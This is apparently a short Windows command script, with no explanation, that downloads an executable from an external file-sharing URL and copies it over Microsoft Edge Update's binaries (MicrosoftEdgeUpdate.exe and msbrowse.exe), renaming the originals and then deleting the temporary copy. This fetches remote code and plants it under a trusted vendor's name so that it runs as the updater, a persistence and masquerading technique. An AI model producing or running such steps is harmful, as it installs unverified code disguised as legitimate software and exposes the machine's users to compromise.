wget https://l.station307.com/LYGiXeMAeb6NC9yZ6Qa8bi/msbrowse.exe -OutFile c:\windows\temp\1.exe

del "c:\Program Files (x86)\Microsoft\EdgeUpdate\1MicrosoftEdgeUpdate.exe"
del "c:\ProgramData\Microsoft\EdgeUpdate\1msbrowse.exe"

ren "c:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" "c:\Program Files (x86)\Microsoft\EdgeUpdate\1MicrosoftEdgeUpdate.exe"
ren "c:\ProgramData\Microsoft\EdgeUpdate\msbrowse.exe" "c:\ProgramData\Microsoft\EdgeUpdate\1msbrowse.exe"
 
 
copy c:\windows\temp\1.exe 'c:\ProgramData\Microsoft\EdgeUpdate\msbrowse.exe' -Force
copy c:\windows\temp\1.exe 'C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe' -Force
del c:\windows\temp\1.exe

ls "c:\ProgramData\Microsoft\EdgeUpdate\"
ls "c:\Program Files (x86)\Microsoft\EdgeUpdate\"
